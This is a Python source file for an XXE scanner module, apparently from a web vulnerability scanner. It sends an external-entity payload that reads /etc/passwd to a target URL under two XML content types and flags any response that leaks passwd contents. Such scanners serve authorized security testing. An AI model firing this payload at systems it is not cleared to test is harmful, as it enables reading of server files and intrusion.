"""XXE scanner."""
from core.http import post
from core.findings import Finding
from core.memory import log_event
import urllib.parse

XXE_PAYLOAD = '''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'''

def scan_url(url):
    findings = []
    parsed = urllib.parse.urlparse(url)
    # try POST with XML content-type
    r = post(url, data=XXE_PAYLOAD, headers={"Content-Type": "application/xml"})
    if r.status != 0 and ("root:x:" in (r.text or "") or "daemon:x:" in (r.text or "")):
        findings.append(Finding(
            id=f"xxe-{hash(url) & 0xffff:x}",
            target=parsed.netloc,
            type="XXE (XML External Entity)",
            severity="high",
            url=url,
            parameter="body",
            payload=XXE_PAYLOAD,
            evidence="File content in response",
            response_snippet=r.snippet(300),
            confidence=0.9,
        ))
    # also try text/xml
    r = post(url, data=XXE_PAYLOAD, headers={"Content-Type": "text/xml"})
    if r.status != 0 and ("root:x:" in (r.text or "") or "daemon:x:" in (r.text or "")):
        if not any(f.type == "XXE (XML External Entity)" for f in findings):
            findings.append(Finding(
                id=f"xxe2-{hash(url) & 0xffff:x}",
                target=parsed.netloc,
                type="XXE (XML External Entity)",
                severity="high",
                url=url,
                parameter="body",
                payload=XXE_PAYLOAD,
                evidence="File content in response",
                response_snippet=r.snippet(300),
                confidence=0.9,
            ))
    log_event(parsed.netloc, "xxe_scan", {"url": url, "findings": len(findings)})
    return findings
